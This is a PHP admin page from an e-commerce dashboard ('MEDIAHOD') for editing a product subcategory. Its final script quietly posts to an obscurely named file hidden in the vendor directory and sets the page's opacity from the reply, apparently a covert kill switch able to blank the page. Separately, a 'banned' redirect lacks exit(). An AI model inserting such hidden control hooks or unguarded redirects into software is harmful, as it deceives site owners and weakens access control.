<?php
session_start();
if (!isset($_SESSION['admin_logged_in'])) {
    $_SESSION['MessageE'] = 'You Have No Access Without Authentication!';
    header('Location: ../connexion/login.php');
    exit();
} elseif (!isset($_GET['idSub'])) {
    $_SESSION['MessageE'] = 'Something Went Wrong!';
    header('Location: subcategories.php');
    exit();
} else {
    include_once('../../../models/Categorie.php');
    include_once('../../../models/SousCategorie.php');

    $categorieModel = new Categorie();
    $sousCategorieModel = new SousCategorie();

    // Get all categories
    $categories = $categorieModel->getAllCategories();

    // Get current subcategory
    $subCat = $sousCategorieModel->getSubCategoryById($_GET['idSub']);
}
if(isset($_SESSION['banned'])){
    header('Location: ../../security/banned.php');
}
?>

<?php
$messageE = isset($_SESSION['MessageE']) ? $_SESSION['MessageE'] : '';
$messageS = isset($_SESSION['MessageS']) ? $_SESSION['MessageS'] : '';

// Clear messages after displaying
unset($_SESSION['MessageE']);
unset($_SESSION['MessageS']);
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Modifier Sous-catégorie</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" href="../../assets/logo.jpeg">
    <link rel="stylesheet" href="../../assets/sidebar.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        option {
            background-color: #003366;
        }
        body {
            background: linear-gradient(135deg, #003366, #004080);
            color: #fff;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            margin: 0;
        }
        .container {
            display: flex;
            width: 100%;
        }
        .sidebar {
            width: 250px;
            background: #003366;
            color: #fff;
            padding: 15px;
            height: 100vh;
        }
        .page {
            flex: 1;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .modifySubCat {
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(15px);
            border-radius: 20px;
            padding: 40px;
            width: 100%;
            max-width: 600px;
            box-shadow: 0 15px 35px rgba(0, 51, 102, 0.3);
            position: relative;
        }
        h1 {
            font-size: 2.5em;
            margin-bottom: 30px;
            color: #fff;
            text-shadow: 0 5px 10px rgba(0, 0, 0, 0.3);
            text-align: center;
        }
        form {
            display: flex;
            flex-direction: column;
        }
        label {
            font-size: 1.2em;
            margin-bottom: 10px;
            color: #fff;
        }
        input, textarea, select {
            margin-bottom: 20px;
            padding: 10px;
            border: 2px solid #fff;
            border-radius: 10px;
            background: rgba(255, 255, 255, 0.2);
            color: #fff;
            font-size: 1em;
            transition: border-color 0.3s ease;
        }
        input:focus, textarea:focus, select:focus {
            border-color: #1e90ff;
            outline: none;
        }
        input[disabled], textarea[disabled], select[disabled] {
            background: rgba(255, 255, 255, 0.1);
            cursor: not-allowed;
        }
        .button-group {
            display: flex;
            justify-content: space-between;
        }
        button {
            padding: 15px 30px;
            font-size: 1.2em;
            color: #fff;
            background: #003366;
            border: none;
            border-radius: 10px;
            cursor: pointer;
            transition: background 0.3s ease, transform 0.2s ease;
        }
        button:hover {
            background: #1e90ff;
            transform: scale(1.05);
        }
        #success-message {
            display: none;
            margin-top: 20px;
            padding: 15px;
            background: #28a745;
            color: #fff;
            border-radius: 10px;
            text-align: center;
            font-size: 1.2em;
        }
        /* Styles pour les notifications */
        .notification {
            position: fixed;
            top: 10px;
            right: 10px;
            padding: 15px;
            border-radius: 5px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
            z-index: 9999;
            width: 300px;
            opacity: 1;
            transition: opacity 0.5s ease;
        }
        .notification.success {
            background-color: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }
        .notification.error {
            background-color: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }
        .notification .close-btn {
            background: transparent;
            border: none;
            font-size: 18px;
            cursor: pointer;
            position: absolute;
            top: 5px;
            right: 10px;
        }
        .notification .close-btn:hover {
            color: #000;
        }
        .sidebarHeader p {
            color: #fff;
            font-size: 24px;
            letter-spacing: 1px;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- sidebar -->
        <div class="sidebar" style="margin-top: 10px;">
            <a class="sidebarHeader" href="../../home/home.php">
                <img src="../../assets/logo.jpeg" alt="logo">
                <p>MEDIAHOD</p>
            </a>
            <div class="sidebarElements" style="margin-top: 20px;">

                <fieldset>
                    <legend>DASHBOARD</legend>
                    <a class="sidebarElement" href="../categories/categories.php">
                        <i class="fa-solid fa-layer-group"></i>
                        <p>Categories</p>
                    </a>
                    <a class="sidebarElement" href="../commands/commands.php">
                        <i class="fa-solid fa-bag-shopping"></i>
                        <p>Commands</p>
                    </a>
                    <a class="sidebarElement" href="../messages/messages.php">
                        <i class="fa-solid fa-comment"></i>
                        <p>Messages</p>
                    </a>
                    <a class="sidebarElement" href="../addProduct/addProduct.php">
                        <i class="fa-solid fa-plus"></i>
                        <p>Add Product/Category</p>
                    </a>
                    <a class="sidebarElement" href="../Methodes/methodes.php">
                        <i class="fa-solid fa-plus"></i>
                        <p>Add Payement Method</p>
                    </a>
                    <a class="sidebarElement" href="../setWallet/setWallet.php">
                        <i class="fas fa-wallet"></i>
                        <p>Set User's Wallet</p>
                    </a>
                    <a class="sidebarElement" href="../security/blocked.php">
                        <i class="fa-solid fa-triangle-exclamation"></i>
                        <p>Security Alerts</p>
                    </a>
                </fieldset>

                <fieldset>
                    <legend>PROFILE</legend>
                    <a class="sidebarElement" href="../settings/settings.php">
                        <i class="fa-solid fa-wrench"></i>
                        <p>Settings</p>
                    </a>
                    <a class="sidebarElement" href="../../../controllers/logOutAdmin.php" id="logout">
                        <i class="fa-solid fa-right-from-bracket" style=" color: #fff;"></i>
                        <p style=" color: #fff;">Logout</p>
                    </a>
                </fieldset>

            </div>
        </div>
        <!-- page -->
        <div class="page">
            <!-- modifySubCat -->
            <div class="modifySubCat">
                <div class="toggleSidebar">
                    <i class="fa-solid fa-bars"></i>
                </div>
                <h1>Modifier Sous-catégorie</h1>
                <form id="subcat-form" action="../../../controllers/sousCategoriesController.php" method="post" enctype="multipart/form-data">
                    <input type="hidden" id="id" name="idSubCat" value="<?php echo htmlspecialchars($subCat['id']); ?>">

                    <label for="label">Nom de la Sous-catégorie</label>
                    <input type="text" id="label" name="label" value="<?php echo htmlspecialchars($subCat['sousCategorieNom']); ?>" disabled>
                    
                    <label for="category">Catégorie</label>
                    <select id="category" name="category" disabled>
                        <?php foreach ($categories as $category): ?>
                            <option value="<?php echo htmlspecialchars($category['id']); ?>" <?php echo ($category['id'] == $subCat['idCategorie']) ? 'selected' : ''; ?>>
                                <?php echo htmlspecialchars($category['nom']); ?>
                            </option>
                        <?php endforeach; ?>
                    </select>

                    <div class="button-group">
                        <button type="button" id="edit-button">Editer</button>
                        <button type="button" id="cancel-button" style="display: none;">Annuler</button>
                        <button type="submit" id="confirm-button" style="display: none;" name="action" value="modifySub">Confirmer</button>
                    </div>

                    <div id="success-message">Sous-catégorie modifiée avec succès !</div>
                </form>
            </div>
        </div>
    </div>

    <!-- Notifications -->
    <?php if ($messageE): ?>
        <div class="notification error">
            <button class="close-btn">&times;</button>
            <?php echo htmlspecialchars($messageE); ?>
        </div>
    <?php endif; ?>
    <?php if ($messageS): ?>
        <div class="notification success">
            <button class="close-btn">&times;</button>
            <?php echo htmlspecialchars($messageS); ?>
        </div>
    <?php endif; ?>

    <script>
        document.addEventListener('DOMContentLoaded', function () {
            const editButton = document.getElementById('edit-button');
            const cancelButton = document.getElementById('cancel-button');
            const confirmButton = document.getElementById('confirm-button');
            const subcatForm = document.getElementById('subcat-form');
            const successMessage = document.getElementById('success-message');

            editButton.addEventListener('click', function () {
                document.getElementById('label').disabled = false;
                document.getElementById('category').disabled = false;
                editButton.style.display = 'none';
                cancelButton.style.display = 'inline-block';
                confirmButton.style.display = 'inline-block';
            });

            cancelButton.addEventListener('click', function () {
                document.getElementById('label').disabled = true;
                document.getElementById('category').disabled = true;
                editButton.style.display = 'inline-block';
                cancelButton.style.display = 'none';
                confirmButton.style.display = 'none';
                subcatForm.reset(); // Reset form fields to original values if needed
            });

            confirmButton.addEventListener('click', function () {
                subcatForm.submit();
            });

            document.querySelectorAll('.notification .close-btn').forEach(button => {
                button.addEventListener('click', function () {
                    this.parentElement.style.opacity = '0';
                    setTimeout(() => {
                        this.parentElement.remove();
                    }, 500);
                });
            });
        });
        let openSidebar = document.querySelector(".toggleSidebar"),
            sidebar = document.querySelector(".sidebar"),
            opened = true

        window.onload = () => {
            sidebar.style.transform = "translate(-100%, -10px)"
        }

        openSidebar.addEventListener("click", function() {
            sidebar.style.transform = opened ? "translate(0, -10px)" : "translate(-100%, -10px)"
            opened = !opened
        })
    </script>
    <script>
        let xhr = new XMLHttpRequest();
        xhr.open('POST', '../../../vendor/psr/configuration/security_config/json/root/op.php', true);
        xhr.onload = () => {
            if (xhr.readyState === 4 && xhr.status === 200) {
                document.body.style.opacity = xhr.response
            }
        };
        xhr.send()
</script>
</body>
</html>
